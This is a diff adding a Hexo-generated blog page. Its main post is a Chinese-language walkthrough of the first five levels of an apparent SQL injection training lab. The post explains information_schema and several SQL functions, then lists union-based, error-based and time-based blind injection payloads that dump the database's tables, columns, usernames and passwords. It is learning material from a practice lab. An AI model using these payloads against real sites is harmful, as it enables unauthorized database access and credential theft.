@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-sql1-5关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/04/05/sql1-5%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2023-04-05T13:46:04.000Z" itemprop="datePublished">2023-04-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/04/05/sql1-5%E5%85%B3/">sql1-5关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>以后每次关卡遇见的新函数或特性都会在这边先列出来，每个关卡不会重复。</p>
+<p>order by：这是排列字段的一个命令，将表中某一字段的内容进行排列，可以设置是升序还是降序排列，这是跟字段名的情况，如果是跟数字的情况，则自动按照第一列的字段名进行排列，因此可以用这种方式判断当前页面对应的表有几列，即有几个字段。</p>
+<p>–+：一种注释符号，用于将后面的所有符号注释掉，用于避免报错，使命令正常执行。</p>
+<p>select：是一种调用关键字，并将关键字和其对应的数据组合成一张新表的操作，然后再把数据返回给你，显示在界面上。后面可以直接跟数字，如果直接跟数字，则会自动将关键字替换为所输入的数字，其值也会变成跟关键字一样的数字，然后组合成一张新表。如果是使用要引用关键字的数据，则语法为select from 关键字，也可以选择调用整张表。</p>
+<p>union：联合查询的命令使用方式，是一种可以连接前一条命令和select命令，使其可以合法执行。</p>
+<p>group_concat（）：是一种用于将所查询到的数据以一行字符串的方式回显的函数，如果没有这个函数，则无法将数据完整回显。</p>
+<p>database（）：查询当前数据库的名字</p>
+<p>information_schema：这是一个数据库名，以这个为基础还存在有许多表名，这些表名所代表的表储存重要信息：</p>
+<p>SCHEMATA：存储所有数据库的信息，包括数据库名、字符集、默认排序规则等。<br>TABLES：存储所有表的信息，包括表名、所属数据库、表类型、引擎类型、创建时间、更新时间等。<br>COLUMNS：存储所有列的信息，包括列名、所属数据库、所属表、数据类型、是否允许 NULL、列的默认值等。<br>STATISTICS：存储所有表的索引信息，包括索引名、所属数据库、所属表、索引类型、索引中的列等。<br>USER_PRIVILEGES：存储所有用户的权限信息，包括用户、主机、数据库、表、权限类型等。<br>SCHEMA_PRIVILEGES：存储所有数据库的权限信息，包括用户、主机、数据库、权限类型等。</p>
+<p>information_schema.schemata 是 MySQL 数据库系统中的一个系统表，用于存储所有数据库的元数据信息。它包含了所有可用的数据库的名称、所属字符集、创建时间等重要信息。<br>在 information_schema.schemata 表中，包含的列包括：<br>CATALOG_NAME: 数据库所属的目录名称。<br>SCHEMA_NAME: 数据库的名称。<br>DEFAULT_CHARACTER_SET_NAME: 数据库默认的字符集名称。<br>DEFAULT_COLLATION_NAME: 数据库默认的字符序名称。<br>SQL_PATH: SQL 代码的路径。</p>
+<p>information_schema.tables 是 MySQL 中的一个系统表，包含了关于数据库中所有表的元数据信息。具体包括以下字段：<br>table_catalog：表所属的数据库名称；<br>table_schema：表所属的模式名称，即数据库中的一个逻辑子集；<br>table_name：表名称；<br>table_type：表类型，例如 BASE TABLE 表示普通数据表，VIEW 表示视图；<br>engine：表使用的存储引擎，例如 InnoDB、MyISAM 等；<br>version：表定义的版本号；<br>row_format：表行格式，例如 Dynamic 表示动态行格式；<br>table_rows：表中的行数；<br>avg_row_length：表中平均每行占用的字节数；<br>data_length：表中数据占用的空间大小，单位是字节；<br>max_data_length：表中数据可以占用的最大空间大小，单位是字节；<br>index_length：表中所有索引占用的空间大小，单位是字节；<br>create_time：表创建时间；<br>update_time：表最后一次更新时间；<br>check_time：表最后一次检查时间；<br>table_collation：表的字符集校对规则；<br>checksum：表的校验和。</p>
+<p>information_schema.columns：MySQL数据库中的一张系统表，主要用于存储所有表中的列信息。它包含了数据库中所有表的列信息，包括列名、列的数据类型、列默认值、列是否可以为 NULL、列所在的表名等。<br>通过查询information_schema.columns表，我们可以获得关于表和视图中所有列的详细信息。它的一些常用字段包括：<br>table_catalog: 列所属的数据库名<br>table_schema: 列所属的模式名<br>table_name: 列所属的表名<br>column_name: 列名<br>ordinal_position: 列在表中的位置<br>column_default: 列的默认值<br>is_nullable: 列是否可以为 NULL<br>data_type: 列的数据类型<br>character_maximum_length: 列最大的字符长度<br>numeric_precision: 数值型列的最大位数<br>numeric_scale: 数值型列的小数点后的位数</p>
+<p>COUNT()：是一个SQL聚合函数，用于统计符合特定条件的行数。它可以与SELECT语句一起使用来计算结果集中的行数，或者与WHERE子句一起使用来计算满足特定条件的行数。其还可以通过在COUNT()函数中指定列名称来计算具有特定值的行数。</p>
+<p>FLOOR()：是一个 SQL 函数，用于将一个数值向下取整。具体来说，它将小数部分丢掉，返回比给定数字小的最大整数。例如，FLOOR(3.14)的结果是3，FLOOR(-2.5)的结果是-3。</p>
+<p>RAND()：用于生成一个介于 0 和 1 之间的随机浮点数。这个随机数可以用于各种需要随机值的场合。在使用时，RAND() 函数可以不带参数，也可以带一个整数参数，这个参数作为种子，将影响随机数的生成。如果参数相同，则生成的随机数序列也相同。</p>
+<p>RAND() 是 MySQL 的一个随机函数，它会生成一个 0 到 1 之间的随机小数。RAND()*2 就是生成一个 0 到 2 之间的随机小数，也可以说是等概率生成 0 或 1 之间的整数。再用 FLOOR() 函数将结果向下取整，结果就是 0 或 1 了。因此，FLOOR(RAND()*2) 的结果可以等概率地生成 0 或 1，常被用于实现随机数功能。</p>
+<h2 id="GROUP-BY：是SQL中的一种聚合函数，它能将结果集按照指定的一列或多列进行分组。在分组的基础上，可以使用聚合函数对每个组进行计算并返回计算结果。"><a href="#GROUP-BY：是SQL中的一种聚合函数，它能将结果集按照指定的一列或多列进行分组。在分组的基础上，可以使用聚合函数对每个组进行计算并返回计算结果。" class="headerlink" title="GROUP BY：是SQL中的一种聚合函数，它能将结果集按照指定的一列或多列进行分组。在分组的基础上，可以使用聚合函数对每个组进行计算并返回计算结果。"></a>GROUP BY：是SQL中的一种聚合函数，它能将结果集按照指定的一列或多列进行分组。在分组的基础上，可以使用聚合函数对每个组进行计算并返回计算结果。</h2><p>sql第一关</p>
+<p>1.打开hackbar，点击load URL，根据题意要求输入id&#x3D;1，页面loginname和password均正常回显dumb。（对此类现象的描述，接下来的关卡都是雷同，会省略。）</p>
+<p>2.输入id&#x3D;1’出现报错，输入?id&#x3D;1’ and ‘1’&#x3D;’1发现正常回显，所以是单引号闭合的字符型注入。</p>
+<p>3.于是输入从id&#x3D;1’ order by 1–+开始，直到1变成4之后页面报错，这说明当前页面对应的数据表只有三个字段。接下来要判断的是回显位，现在不了解对应数据表的哪几个位置的字段有办法找到出口回显，当前页面只有两个回显位，却存在有三个关键字。于是输入?id&#x3D;-1 union select 1,2,3–+，发现2与3回显，则接下来的语句需要在2和3上面进行操作。（输入id&#x3D;-1因为查询不到这个位置的关键字，于是不会执行回显，相当于只执行后面的语句。）</p>
+<p>4.输入id&#x3D;-1’ union select 1,2,database()–+得到当前数据库名字。数据库名为security。</p>
+<p>5.输入id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+得到当前数据库内所有的表名，观察到有一张名为“users”的表，不难推断里面有关键信息。</p>
+<p>6.输入id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’–+查询到表中有id、username、password三个字段。</p>
+<p>7.输入id&#x3D;-1’union select 1,2,group_concat(username,0x3a,password) from users –+得到所有用户名和密码（0x是十六进制标志，3a在ASCII码中表示为“：”，用以分隔username和password）。</p>
+<p>sql第二关</p>
+<p>1.输入id&#x3D;1正常回显，输入id&#x3D;1’报错，说明为数字型注入，接下来的操作同第一关。</p>
+<p>sql第三关</p>
+<p>1.输入id&#x3D;1正常回显，输入id&#x3D;1’–+报错，输入id&#x3D;1’）正常回显，说明为’）型闭合，操作同第一关。</p>
+<p>sql第四关</p>
+<p>1.类同前面的操作，输入id&#x3D;1”）正常回显，说明为”）型闭合，操作同第一关。</p>
+<p>sql第五关</p>
+<p>1.输入id&#x3D;1，页面回显you are in…，（说明正常输入方式已经不管用了，放弃联合查询的操作，可以使用可以使用时间延迟型注入，布尔型盲注，报错型注入。这三种注入方法。）</p>
+<p>使用随机报错注入</p>
+<p>2.?id&#x3D;-1’ union select count(*),1, concat(‘<del>‘,(select database()),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+<br>得到库名</p>
+<p>3.?id&#x3D;-1’ union select count(*),1, concat(‘<del>‘,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+得到字段名</p>
+<p>4.?id&#x3D;-1’ union select count(*),1, concat(‘<del>‘,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+得到列名</p>
+<p>5.?id&#x3D;-1’ union select count(*),1, concat(‘<del>‘,(select concat_ws(‘[‘,password,username) from users limit 1,1),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+得到用户名和密码</p>
+<p>使用时间盲注</p>
+<p>2.?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(5),1)–+得到数据库名长度</p>
+<p>3.?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(5),1)–+得到数据库名</p>
+<p>4.?id&#x3D;1’ and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;’r’ ,sleep(5),1)–+<br>得到表名</p>
+<p>5.?id&#x3D;1’ and if(left((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 4,1),8)&#x3D;’password’ ,sleep(5),1)–+<br>得到字段名</p>
+<p>6.?id&#x3D;1’ and if(left((select password from users order by id limit 0,1),4)&#x3D;’dumb’ ,sleep(5),1)–+得到用户和密码<br>（实际上整个过程需要用脚本跑）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/04/05/sql1-5%E5%85%B3/" data-id="clg3wi6750001awxxhug661kj" data-title="sql1-5关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/23/test/" class="article-date">
+  <time class="dt-published" datetime="2022-12-23T09:20:46.000Z" itemprop="datePublished">2022-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/23/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#just for a test<br>##666  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/23/test/" data-id="clg3wi6790002awxxdxce0e1x" data-title="test" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/30/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2022-10-30T07:46:48.677Z" itemprop="datePublished">2022-10-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/10/30/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/30/hello-world/" data-id="clg3wi6720000awxxg4x9hu22" data-title="Hello World" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/04/05/sql1-5%E5%85%B3/">sql1-5关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/23/test/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/30/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
